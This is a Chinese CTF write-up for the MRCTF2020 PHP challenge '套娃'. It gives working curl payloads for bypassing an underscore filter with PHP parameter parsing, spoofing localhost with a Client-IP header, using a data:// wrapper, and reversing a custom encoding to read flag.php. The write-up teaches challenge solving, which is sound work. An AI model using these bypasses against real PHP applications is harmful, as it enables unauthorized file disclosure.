# [MRCTF2020]套娃

## 题目概述
一道多层绕过的 PHP Web 题目，需要依次绕过参数名过滤、正则匹配、IP检测、文件内容检测等多重限制，最终读取 flag。

## 信息收集
1. 访问首页，HTML注释中发现第一层 PHP 源码
2. 绕过第一层后提示 FLAG 在 `secrettw.php`
3. POST 参数 `Merak` 后显示完整 PHP 源码和 JSFuck 编码的提示

## 漏洞分析（漏洞类型、原理、判断过程）

### 第一层：PHP参数解析差异
```php
$query = $_SERVER['QUERY_STRING'];
if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```
- **原理**：PHP 解析 GET 参数时，会将 `.` 和 ` `（空格）转换为 `_`
- **绕过**：用 `b.u.p.t` 代替 `b_u_p_t`，用 `%0a`（换行符）绕过精确匹配但满足正则

### 第二层：IP伪造 + data协议
```php
$ip = getIp();
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day'){
    echo file_get_contents(change($_GET['file']));
}
```
- **IP伪造**：通过 `Client-IP: 127.0.0.1` 请求头绕过
- **data协议**：用 `data://text/plain,todat is a happy day` 满足文件内容检测

### 第三层：自定义编码逆向
```php
function change($v){
    $v = base64_decode($v);
    $re = '';
    for($i=0;$i<strlen($v);$i++){
        $re .= chr ( ord ($v[$i]) + $i*2 );
    }
    return $re;
}
```
- **原理**：每个字符 ASCII 值加上 `索引*2`
- **逆向**：目标字符串 `flag.php`，计算原始字符 = `目标字符 - 索引*2`

## 利用过程（Payload + Flag）

### Step 1：绕过参数名过滤
```bash
curl -s "http://target/?b.u.p.t=23333%0a"
# 返回提示：FLAG is in secrettw.php
```

### Step 2：计算 file 参数
```python
target = "flag.php"
result = ""
for i in range(len(target)):
    result += chr(ord(target[i]) - i*2)
# result = "fj]a&f\\b"
# base64 = "ZmpdYSZmXGI="
```

### Step 3：获取 flag
```bash
curl -s "http://target/secrettw.php?2333=data://text/plain,todat%20is%20a%20happy%20day&file=ZmpdYSZmXGI=" \
  -H "Client-IP: 127.0.0.1"
# 返回：$flag = 'flag{7ce364b6-e4cb-43b9-8532-975e833fdb64}';
```

## 复现步骤
1. 访问首页，分析 HTML 注释中的 PHP 源码
2. 构造 `?b.u.p.t=23333%0a` 绕过第一层
3. 访问 `secrettw.php`，POST `Merak=1` 获取完整源码
4. 解码 JSFuck 得到提示 `post me Merak`
5. 伪造 IP 头，使用 data 协议，计算逆向编码读取 flag.php

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP参数解析差异 | `b_u_p_t` 参数 | `b.u.p.t=23333%0a` | PHP将`.`和空格转为`_` |
| IP伪造 | `getIp()` 函数 | `Client-IP: 127.0.0.1` | HTTP头伪造本地IP |
| data协议 | `file_get_contents($_GET['2333'])` | `data://text/plain,xxx` | 伪协议控制文件内容 |
| 编码逆向 | `change()` 函数 | `ZmpdYSZmXGI=` | ASCII偏移计算 |

## 知识总结（解题技巧、同类题型套路）
1. **PHP参数解析特性**：遇到下划线过滤时，尝试用 `.` 或空格替代
2. **正则与精确匹配差异**：`%0a` 换行符可绕过 `===` 但满足 `^$` 正则
3. **IP伪造常用头**：`Client-IP`、`X-Forwarded-For`、`X-Real-IP`
4. **自定义编码逆向**：分析编码逻辑，反向计算原始值
5. **JSFuck解码**：使用 Node.js 执行即可还原
